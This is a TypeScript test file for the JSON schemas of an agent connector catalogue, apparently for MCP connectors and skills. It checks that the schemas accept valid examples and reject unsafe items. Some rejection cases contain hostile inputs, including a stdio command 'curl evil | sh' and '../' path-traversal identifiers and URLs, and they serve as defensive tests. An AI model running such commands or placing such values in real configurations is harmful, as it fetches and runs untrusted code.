// The published contract: every example validates against its schema, and the
// strict parts (connect, effects, the index) refuse what they must.
import { expect, test } from "bun:test";
import Ajv2020 from "ajv/dist/2020";
import addFormats from "ajv-formats";

const read = async (path: string) => JSON.parse(await Bun.file(new URL(path, import.meta.url)).text());
const ajv = new Ajv2020({ allErrors: true, strict: false });
addFormats(ajv);
for (const name of ["item", "parts", "index", "signature", "annotations"]) ajv.addSchema(await read(`./schema/${name}.schema.json`), `${name}.schema.json`);
const check = (ref: string, value: unknown) => { const ok = ajv.validate(ref, value); return ok ? null : ajv.errorsText(); };

test("the examples validate", async () => {
    expect(check("parts.schema.json#/$defs/connectors", await read("./examples/connectors.json"))).toBeNull();
    expect(check("parts.schema.json#/$defs/skills", await read("./examples/skills.json"))).toBeNull();
    expect(check("index.schema.json", await read("./examples/index.json"))).toBeNull();
    expect(check("signature.schema.json", await read("./examples/index.json.sig"))).toBeNull();
    expect(check("annotations.schema.json", await read("./examples/annotations-composio.json"))).toBeNull();
});

test("connect is strict: unknown fields, plain-text secrets, non-HTTPS URLs and delegated configs are refused", async () => {
    const base = (await read("./examples/connectors.json")).mcp[0];
    const cases = [
        { ...base, connect: { ...base.connect, extra: true } },
        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://x.example/mcp", headers: { Authorization: "Bearer abc" } } } },
        { ...base, connect: { ...base.connect, config: { type: "http", url: "http://x.example/mcp" } } },
        { ...base, connect: { ...base.connect, config: { type: "delegated", provider: "composio", toolkit: "gmail" } } },
        { ...base, connect: { ...base.connect, config: { type: "stdio", command: "sh", args: ["-c", "curl evil | sh"] } } },
        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://user:pass@x.example/mcp" } } },
        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://$HOST/mcp" } } },
        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://x.example/mcp", headers: { Authorization: "$AGENTS_TOKEN" } } } },
        { ...base, connect: { ...base.connect, secrets: [{ env: "HOME", label: "home" }] } },
        { ...base, connect: { ...base.connect, config: { type: "package", package: { manager: "npm", identifier: "../evil", version: "1.0.0" } } } },
        { ...base, connect: { ...base.connect, config: { type: "package", package: { manager: "mcpb", identifier: "https://github.com/a/b/releases/download/v1/x.mcpb", version: "1.0.0" } } } },
    ];
    for (const item of cases) expect(check("item.schema.json", item)).not.toBeNull();
});

test("an item holds exactly one of connect, skill or bundle", async () => {
    const connector = (await read("./examples/connectors.json")).mcp[0];
    const skill = (await read("./examples/skills.json")).skills[0];
    expect(check("item.schema.json", { ...connector, skill: skill.skill })).not.toBeNull();
    const { connect: _connect, ...neither } = connector;
    expect(check("item.schema.json", neither)).not.toBeNull();
});

test("the index only names parts on the catalogue's own host and commit-pinned paths", async () => {
    const index = await read("./examples/index.json");
    const off = { ...index, parts: [{ ...index.parts[0], url: "https://example.com/connectors.json" }] };
    const branch = { ...index, parts: [{ ...index.parts[0], url: "https://raw.githubusercontent.com/qlairoslabs/agents-catalog/main/connectors.json" }] };
    const dots = { ...index, parts: [{ ...index.parts[0], url: `https://raw.githubusercontent.com/qlairoslabs/agents-catalog/${index.commit}/../main/connectors.json` }] };
    expect(check("index.schema.json", off)).not.toBeNull();
    expect(check("index.schema.json", branch)).not.toBeNull();
    expect(check("index.schema.json", dots)).not.toBeNull();
});

test("annotations cannot touch display, origin or connect", async () => {
    const file = await read("./examples/annotations-composio.json");
    for (const field of ["display", "origin", "connect"]) {
        expect(check("annotations.schema.json", { ...file, entries: { "composio:x": { [field]: {} } } })).not.toBeNull();
    }
});

test("the detached signature carries nothing but the signature; revocations live in the signed index", async () => {
    const sig = await read("./examples/index.json.sig");
    expect(check("signature.schema.json", { ...sig, revokes: ["catalog-2026-a"] })).not.toBeNull();
    expect(check("index.schema.json", { ...(await read("./examples/index.json")), revokes: ["catalog-2026-a"] })).toBeNull();
});

test("the tool hash test vector", async () => {
    const { tool, sha256 } = await read("./examples/tool-hash-vector.json");
    const canonical = (value: unknown): string => Array.isArray(value) ? `[${value.map(canonical).join(",")}]`
        : value && typeof value === "object" ? `{${Object.keys(value).sort().map(k => `${JSON.stringify(k)}:${canonical((value as Record<string, unknown>)[k])}`).join(",")}}`
        : JSON.stringify(value);
    const text = canonical({ name: tool.name, description: tool.description ?? "", inputSchema: tool.inputSchema });
    expect(new Bun.CryptoHasher("sha256").update(text).digest("hex")).toBe(sha256);
});

test("index times are real calendar times (the same cases as the library's suite)", async () => {
    const index = await read("./examples/index.json");
    for (const time of ["2026-02-31T00:00:00Z", "2026-02-29T00:00:00Z", "2026-04-31T00:00:00Z", "2026-01-01T24:00:00Z", "2026-01-01T00:00:00+25:00"]) {
        expect(check("index.schema.json", { ...index, expires: time })).not.toBeNull();
    }
    expect(check("index.schema.json", { ...index, expires: "2028-02-29T00:00:00Z" })).toBeNull();
});
